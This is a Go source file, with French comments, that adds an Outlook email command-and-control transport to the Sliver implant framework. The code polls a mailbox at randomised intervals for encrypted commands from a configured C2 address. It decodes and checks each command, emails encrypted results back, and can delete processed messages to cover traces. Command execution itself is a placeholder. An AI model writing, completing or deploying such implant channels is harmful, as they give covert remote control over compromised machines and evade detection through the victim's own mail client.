package outlook

/*
	Sliver Implant Framework
	Copyright (C) 2024  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"encoding/base64"
	"fmt"
	"log"
	"math/rand"
	"time"
)

// OutlookTransport gère la communication C2 via Outlook COM
type OutlookTransport struct {
	comHelper    *OutlookCOMHelper
	config       *OutlookConfig
	running      bool
	stopChan     chan struct{}
	errorCount   int
	lastPollTime time.Time
}

// NewOutlookTransport crée une nouvelle instance du transport Outlook
func NewOutlookTransport(config *OutlookConfig) (*OutlookTransport, error) {
	// Valider la configuration
	if err := config.Validate(); err != nil {
		return nil, fmt.Errorf("invalid outlook config: %w", err)
	}

	// Initialiser le helper COM
	comHelper, err := NewOutlookCOMHelper()
	if err != nil {
		return nil, fmt.Errorf("failed to initialize outlook COM: %w", err)
	}

	return &OutlookTransport{
		comHelper:    comHelper,
		config:       config,
		running:      false,
		stopChan:     make(chan struct{}),
		errorCount:   0,
		lastPollTime: time.Time{},
	}, nil
}

// Start démarre le transport et commence le polling
func (t *OutlookTransport) Start(ctx context.Context) error {
	if !t.config.Enabled {
		return fmt.Errorf("outlook transport is disabled")
	}

	if t.running {
		return fmt.Errorf("outlook transport already running")
	}

	t.running = true

	if t.config.Debug {
		log.Printf("[Outlook Transport] Starting with poll interval: %v", t.config.PollInterval)
	}

	// Calculer l'intervalle de polling avec jitter
	pollInterval := t.calculateInterval()
	ticker := time.NewTicker(pollInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			if t.config.Debug {
				log.Printf("[Outlook Transport] Context cancelled, stopping")
			}
			t.running = false
			return ctx.Err()

		case <-t.stopChan:
			if t.config.Debug {
				log.Printf("[Outlook Transport] Stop signal received")
			}
			t.running = false
			return nil

		case <-ticker.C:
			t.lastPollTime = time.Now()

			if t.config.Debug {
				log.Printf("[Outlook Transport] Polling for commands...")
			}

			// Vérifier les commandes
			if err := t.checkForCommands(); err != nil {
				t.errorCount++
				if t.config.Debug {
					log.Printf("[Outlook Transport] Error checking commands: %v (error count: %d)", err, t.errorCount)
				}

				// Si trop d'erreurs, arrêter le transport
				if t.errorCount >= t.config.MaxRetries {
					log.Printf("[Outlook Transport] Max retries exceeded, stopping transport")
					t.running = false
					return fmt.Errorf("max retries exceeded: %d", t.config.MaxRetries)
				}
			} else {
				// Réinitialiser le compteur d'erreurs en cas de succès
				t.errorCount = 0
			}

			// Recalculer l'intervalle avec jitter pour le prochain tick
			pollInterval = t.calculateInterval()
			ticker.Reset(pollInterval)
		}
	}
}

// Stop arrête le transport
func (t *OutlookTransport) Stop() error {
	if !t.running {
		return nil
	}

	close(t.stopChan)
	t.running = false

	if t.config.Debug {
		log.Printf("[Outlook Transport] Stopped")
	}

	return nil
}

// checkForCommands vérifie les nouveaux emails contenant des commandes C2
func (t *OutlookTransport) checkForCommands() error {
	// Récupérer le dossier configuré
	folder, err := t.comHelper.GetFolder(t.config.FolderType)
	if err != nil {
		return fmt.Errorf("failed to get folder: %w", err)
	}
	defer func() {
		if folder != nil {
			// Sur Windows, folder est *ole.IDispatch, on le release
			// Sur d'autres plateformes, c'est interface{}, on ne fait rien
			if releaser, ok := folder.(interface{ Release() }); ok {
				releaser.Release()
			}
		}
	}()

	// Lire les emails non lus
	emails, err := t.comHelper.ReadUnreadEmails(folder, t.config.C2Email)
	if err != nil {
		return fmt.Errorf("failed to read emails: %w", err)
	}

	if t.config.Debug {
		log.Printf("[Outlook Transport] Found %d unread emails", len(emails))
	}

	// Traiter chaque email
	for _, email := range emails {
		if err := t.processCommand(email); err != nil {
			if t.config.Debug {
				log.Printf("[Outlook Transport] Error processing email: %v", err)
			}
			// Continue avec les autres emails même en cas d'erreur
			continue
		}

		// Marquer comme lu
		if err := t.comHelper.MarkAsRead(email.Item); err != nil {
			if t.config.Debug {
				log.Printf("[Outlook Transport] Error marking email as read: %v", err)
			}
		}

		// Supprimer si configuré
		if t.config.DeleteAfter {
			if err := t.comHelper.DeleteEmail(email.Item); err != nil {
				if t.config.Debug {
					log.Printf("[Outlook Transport] Error deleting email: %v", err)
				}
			}
		}
	}

	return nil
}

// processCommand traite un email contenant une commande C2
func (t *OutlookTransport) processCommand(email *EmailMessage) error {
	// Décoder le message C2
	msg, err := DecodeMessage(email.Body, t.config.EncryptionKey)
	if err != nil {
		return fmt.Errorf("failed to decode message: %w", err)
	}

	// Vérifier que c'est une commande
	if msg.Type != "cmd" {
		return fmt.Errorf("unexpected message type: %s", msg.Type)
	}

	// Vérifier la session ID
	if msg.SessionID != t.config.SessionID {
		return fmt.Errorf("session ID mismatch: expected %s, got %s", t.config.SessionID, msg.SessionID)
	}

	if t.config.Debug {
		log.Printf("[Outlook Transport] Received command with TaskID: %s", msg.TaskID)
	}

	// Décoder le payload (command en base64)
	commandBytes, err := base64.StdEncoding.DecodeString(msg.Payload)
	if err != nil {
		return fmt.Errorf("failed to decode command payload: %w", err)
	}

	// Exécuter la commande (cette partie dépend de l'intégration avec Sliver)
	result, err := t.executeCommand(string(commandBytes))
	if err != nil {
		// Envoyer l'erreur comme résultat
		result = fmt.Sprintf("Error: %v", err)
	}

	// Envoyer les résultats
	if err := t.SendResults(msg.TaskID, []byte(result)); err != nil {
		return fmt.Errorf("failed to send results: %w", err)
	}

	return nil
}

// executeCommand exécute une commande (à intégrer avec le système Sliver)
func (t *OutlookTransport) executeCommand(command string) (string, error) {
	// TODO: Intégrer avec le système de tasks de Sliver
	// Pour l'instant, c'est un placeholder
	if t.config.Debug {
		log.Printf("[Outlook Transport] Executing command: %s", command)
	}

	// Exemple simple : retourner un message indiquant que la commande a été reçue
	return fmt.Sprintf("Command received: %s", command), nil
}

// SendResults envoie les résultats d'une commande au C2
func (t *OutlookTransport) SendResults(taskID string, data []byte) error {
	// Encoder les données en base64
	payload := base64.StdEncoding.EncodeToString(data)

	// Créer le message C2
	msg := &C2Message{
		Type:      "result",
		TaskID:    taskID,
		SessionID: t.config.SessionID,
		Payload:   payload,
	}

	// Encoder le message
	subject, body, err := EncodeMessage(msg, t.config.EncryptionKey)
	if err != nil {
		return fmt.Errorf("failed to encode message: %w", err)
	}

	// Envoyer l'email
	if err := t.comHelper.SendEmail(t.config.C2Email, subject, body); err != nil {
		return fmt.Errorf("failed to send email: %w", err)
	}

	if t.config.Debug {
		log.Printf("[Outlook Transport] Results sent for TaskID: %s", taskID)
	}

	return nil
}

// Close libère les ressources du transport
func (t *OutlookTransport) Close() error {
	if t.running {
		if err := t.Stop(); err != nil {
			return err
		}
	}

	if t.comHelper != nil {
		t.comHelper.Close()
	}

	if t.config.Debug {
		log.Printf("[Outlook Transport] Closed")
	}

	return nil
}

// IsRunning retourne si le transport est en cours d'exécution
func (t *OutlookTransport) IsRunning() bool {
	return t.running
}

// GetLastPollTime retourne le dernier temps de polling
func (t *OutlookTransport) GetLastPollTime() time.Time {
	return t.lastPollTime
}

// calculateInterval calcule l'intervalle de polling avec jitter
func (t *OutlookTransport) calculateInterval() time.Duration {
	baseInterval := t.config.PollInterval

	if t.config.Jitter == 0 {
		return baseInterval
	}

	// Calculer le jitter
	jitterPercent := float64(t.config.Jitter) / 100.0
	jitterAmount := float64(baseInterval) * jitterPercent

	// Appliquer un jitter aléatoire (+/- jitterAmount/2)
	rand.Seed(time.Now().UnixNano())
	jitterOffset := (rand.Float64() - 0.5) * jitterAmount

	finalInterval := time.Duration(float64(baseInterval) + jitterOffset)

	// S'assurer que l'intervalle reste dans des limites raisonnables
	minInterval := baseInterval / 2
	maxInterval := baseInterval * 2

	if finalInterval < minInterval {
		finalInterval = minInterval
	} else if finalInterval > maxInterval {
		finalInterval = maxInterval
	}

	return finalInterval
}
